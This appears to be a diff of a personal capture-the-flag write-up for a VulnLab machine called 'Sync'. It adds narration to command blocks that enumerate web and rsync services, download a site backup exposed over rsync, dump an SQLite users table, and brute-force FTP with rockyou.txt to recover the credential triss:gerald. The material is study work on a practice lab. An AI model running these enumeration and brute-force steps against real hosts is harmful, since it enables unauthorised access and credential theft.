@@ -60,13 +60,18 @@ ERROR Opening: https://10.10.95.76 - Connection refused - connect(2) for "10.10.
 http://10.10.95.76 [200 OK] Apache[2.4.52], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.95.76], PasswordField[password], Script, Title[Login]
 ```
 
+Nothing of value. 
+
 ```bash
 ┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync]                                                      
 └─$ feroxbuster --url http://$sync --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
 ```
 
+No interesting directories or files.
 
 #### 873/TCP - rsync
+
+Looks to be rsync (which I don't have a lot of experience in at the moment).
 
 I found this to reference pentesting rsync:
 
@@ -82,14 +87,14 @@ I found this to reference pentesting rsync:
 ```
 rsync is running version 31.0
 
-```text
-@RSYNCD: 31.0
-```
+I enumerated a rsync module named *httpd*. NOTE: "web backup" is NOT another module. I spend a stupid amount of time believing it was and trying to list its contents to repeated faluire (main thought was the ' ' space was causing command issues...).
 
 ```bash
 ┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync]
 └─$ rsync $sync:: 
 httpd           web backup  
+
+Anyway, I got *httpd*'s contents listed:
 
 ┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync] 
 └─$ rsync -av --list-only rsync://$sync/httpd
@@ -103,6 +108,8 @@ drwxr-xr-x          4,096 2023/04/20 13:13:15 www
 -rw-r--r--          2,315 2023/04/20 13:09:10 www/index.php
 -rw-r--r--            101 2023/04/20 13:03:08 www/logout.php
 ```
+
+Appears to be a copy of the website on :80. I referenced the article from earlier and downloaded the contents to my $attacker:
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync] 
@@ -119,10 +126,12 @@ www/logout.php
 ```
 
 ![rysync copy](/assets/img/ctf/vulnlab/easy/sync/3.png)
+
 ![rysync copy](/assets/img/ctf/vulnlab/easy/sync/4.png)
 
-
 ![SQLite DB](/assets/img/ctf/vulnlab/easy/sync/5.png)
+
+There's an SQLite DB in the material. 
 
 ```bash
 ┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync/attacker]  
@@ -134,6 +143,9 @@ db/site.db: SQLite 3.x database, last written using SQLite version 3037002, file
 SQLite version 3.42.0 2023-05-16 12:36:15
 ```
 
+Listed the tables for the DB and selected all items available.
+
+
 ```bash
 sqlite> .tables
 users
@@ -143,12 +155,18 @@ sqlite> select * from users;
 sqlite> 
 ```
 
+Retrieved two users, *admin* and *triss*, and their respective hashes.
+
+I tried cracking the hashes with *john* and *hashcat* but they didn't crack the hash, even though I used *rockyou.txt* which worked for the bruteforce below:
+
 ```bash
 ┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
 └─$ nxc ftp $sync -u triss -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 ...
 FTP         10.10.95.76     21     10.10.95.76      [+] triss:gerald
 ```
+
+Got *triss:gerald*
 
 ![Triss password cracked](/assets/img/ctf/vulnlab/easy/sync/6.png)
 
@@ -203,5 +221,5 @@ httpd  jennifer  sa  triss  ubuntu
 
 # Lessons Learned
 
-<iframe src="https://docs.google.com/spreadsheets/d/e/2PACX-1vTDFNm5WpGz8o9JSi4bYV5Rp34cSlnKC-pAJzThoQnm1pJsPQp2A_ez8BdokErrGYBt2bos8YAh9AsD/pubhtml?gid=219339819&amp;single=true&amp;widget=true&amp;headers=false"></iframe>
+<iframe style="width:100% !important;"  src="https://docs.google.com/spreadsheets/d/e/2PACX-1vTDFNm5WpGz8o9JSi4bYV5Rp34cSlnKC-pAJzThoQnm1pJsPQp2A_ez8BdokErrGYBt2bos8YAh9AsD/pubhtml?gid=219339819&amp;single=true&amp;widget=true&amp;headers=false"></iframe>
 
